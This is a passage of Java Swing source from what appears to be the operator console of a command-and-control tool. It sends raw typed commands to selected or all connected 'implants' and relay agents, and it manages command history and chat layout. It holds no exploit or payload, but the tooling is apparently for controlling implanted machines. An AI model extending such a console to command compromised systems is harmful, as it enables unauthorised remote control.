      if ((this.selectedImplantIndecies == null) || (this.selectedImplantIndecies.length < 1))
      {
        for (int i = 0; i < Drivers.alTerminals.size(); i++)
        {
          if ((this.i_am_public_chat_frame) && ((((Thread_Terminal)Drivers.alTerminals.get(i)).i_am_Controller_Agent) || (((Thread_Terminal)Drivers.alTerminals.get(i)).i_am_Relay_Agent)))
          {
            this.messageTransmittedOK &= ((Thread_Terminal)Drivers.alTerminals.get(i)).sendCommand_RAW(Driver.CHAT_MESSAGE_BROADCAST + "%%%%%" + Driver.FLAG_BROADCAST + "%%%%%" + this.jtfCommand_Broadcast.getText() + "%%%%%" + " " + this.jtfMyScreenName.getText().trim());
          }
          else
          {
            this.messageTransmittedOK &= ((Thread_Terminal)Drivers.alTerminals.get(i)).sendCommand_RAW(this.jtfCommand_Broadcast.getText());
          }

        }

        if (this.messageTransmittedOK)
        {
          this.txtpne_broadcastMessages.appendString(true, false, "ME", "> ALL", this.jtfCommand_Broadcast.getText(), Drivers.clrBackground, Drivers.clrController, Drivers.clrImplant);
        }

        this.jtfCommand_Broadcast.setText("");
      }

      for (int j = 0; j < this.selectedImplantIndecies.length; j++)
      {
        if ((this.i_am_public_chat_frame) && ((((Thread_Terminal)Drivers.alTerminals.get(this.selectedImplantIndecies[j])).i_am_Controller_Agent) || (((Thread_Terminal)Drivers.alTerminals.get(this.selectedImplantIndecies[j])).i_am_Relay_Agent)))
        {
          this.messageTransmittedOK &= ((Thread_Terminal)Drivers.alTerminals.get(this.selectedImplantIndecies[j])).sendCommand_RAW(Driver.CHAT_MESSAGE_BROADCAST + "%%%%%" + Driver.FLAG_PRIVATE + "%%%%%" + this.jtfCommand_Broadcast.getText() + "%%%%%" + " " + this.jtfMyScreenName.getText().trim());
        }
        else
        {
          this.messageTransmittedOK &= ((Thread_Terminal)Drivers.alTerminals.get(this.selectedImplantIndecies[j])).sendCommand_RAW(this.jtfCommand_Broadcast.getText());
        }

        if (this.messageTransmittedOK) {
          this.txtpne_broadcastMessages.appendString(true, false, "ME", ((Thread_Terminal)Drivers.alTerminals.get(this.selectedImplantIndecies[j])).getJListData(), this.jtfCommand_Broadcast.getText(), Drivers.clrBackground, Drivers.clrController, Drivers.clrImplant);
        }
      }

      this.jtfCommand_Broadcast.setText("");

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("broadcastCommand", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean saveCommandHistory(String history)
  {
    try
    {
      if ((history == null) || (this.alMyCommandHistory.contains(history.trim())))
      {
        return true;
      }

      if (this.alMyCommandHistory.size() < 10)
      {
        if ((history != null) && (history.length() > 150))
        {
          this.alMyCommandHistory.add(history.substring(0, 149));
        }
        else
        {
          this.alMyCommandHistory.add(history);
        }

        this.nextAvailSlotInHistory = (this.alMyCommandHistory.size() % 10);

        this.currentCommandHistoryIndex = this.alMyCommandHistory.size();
      }
      else
      {
        if ((history != null) && (history.length() > 150))
        {
          this.alMyCommandHistory.set(this.nextAvailSlotInHistory, history.substring(0, 149));
        }
        else
        {
          this.alMyCommandHistory.set(this.nextAvailSlotInHistory, history);
        }

        this.nextAvailSlotInHistory = (++this.nextAvailSlotInHistory % 10);

        this.currentCommandHistoryIndex = this.nextAvailSlotInHistory;
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("saveCommandHistory", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public void keyTyped(KeyEvent ke)
  {
  }

  public void keyPressed(KeyEvent ke)
  {
  }

  public void keyReleased(KeyEvent ke)
  {
    try
    {
      if (ke.getKeyCode() == 38)
      {
        if ((ke.getSource() == this.jtfCommand_Broadcast) || (ke.getSource() == this.jtfCommand_Private) || (ke.getSource() == this.jtfTerminalCommand))
        {
          moveCommandUp();
        }

      }
      else if (ke.getKeyCode() == 40)
      {
        if ((ke.getSource() == this.jtfCommand_Broadcast) || (ke.getSource() == this.jtfCommand_Private) || (ke.getSource() == this.jtfTerminalCommand))
        {
          moveCommandDown();
        }
      }

    }
    catch (Exception e)
    {
      Drivers.eop("keyReleased", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }
  }

  public boolean moveCommandUp()
  {
    try
    {
      boolean reset = false;

      if ((this.alMyCommandHistory == null) || (this.alMyCommandHistory.size() < 1))
      {
        return false;
      }

      this.currentCommandHistoryIndex = Math.abs(--this.currentCommandHistoryIndex);

      if (this.currentCommandHistoryIndex <= 0)
      {
        reset = true;
      }

      this.currentCommandHistoryIndex %= this.alMyCommandHistory.size();

      if (this.i_am_broadcast_frame)
      {
        this.jtfCommand_Broadcast.setText((String)this.alMyCommandHistory.get(this.currentCommandHistoryIndex));
      }
      else if (this.i_am_private_frame)
      {
        this.jtfTerminalCommand.setText((String)this.alMyCommandHistory.get(this.currentCommandHistoryIndex));
      }

      if (reset)
      {
        this.currentCommandHistoryIndex = this.alMyCommandHistory.size();
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("moveCommandUp", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean configureInterface_ChatClient()
  {
    try
    {
      try
      {
        this.jpnlOptions_ConnectedClients_South.removeAll();
      }
      catch (Exception e)
      {
        this.jpnlOptions_ConnectedClients_South.remove(this.jcbShortcuts);
        this.jpnlOptions_ConnectedClients_South.remove(this.jbtnPrivate);
        this.jpnlOptions_ConnectedClients_South.remove(this.jbtnDisconnectClient);
      }

      this.jpnlOptions_ConnectedClients_South.setLayout(new GridLayout(3, 1));
      this.jpnlOptions_ConnectedClients_South.add(this.jbtnClearScreen);
      this.jpnlOptions_ConnectedClients_South.add(this.jpnlCheckbox_and_jbtnOpen);

      this.jpnlScreenName.add("West", this.jlblMyScreenName);
      this.jpnlScreenName.add("Center", this.jtfMyScreenName);
      this.jpnlOptions_ConnectedClients_South.add(this.jpnlScreenName);

      this.jlblConnectedClients_Text.setText("Connected Controllers");

      this.i_am_public_chat_frame = true;

      this.jtfMyScreenName.setBackground(Color.blue.darker().darker().darker());
      this.jtfMyScreenName.setForeground(Color.white);
      this.jtfMyScreenName.setCaretColor(Color.white);
      this.jtfMyScreenName.setFont(new Font("Courier", 1, 12));
      this.jlblMyScreenName.setOpaque(true);
      this.jlblMyScreenName.setBackground(Drivers.clrBackground);
      this.jlblMyScreenName.setForeground(Drivers.clrForeground);

      validate();

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("configureInterface_ChatClient", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean moveCommandDown()
  {
    try
    {
      if ((this.alMyCommandHistory == null) || (this.alMyCommandHistory.size() < 1))
      {
        return false;
      }

      this.currentCommandHistoryIndex = Math.abs(++this.currentCommandHistoryIndex);

      this.currentCommandHistoryIndex %= this.alMyCommandHistory.size();

      if (this.i_am_broadcast_frame)
      {
        this.jtfCommand_Broadcast.setText((String)this.alMyCommandHistory.get(this.currentCommandHistoryIndex));
      }
      else if (this.i_am_private_frame)
      {
        this.jtfTerminalCommand.setText((String)this.alMyCommandHistory.get(this.currentCommandHistoryIndex));
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("moveCommandDown", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }
}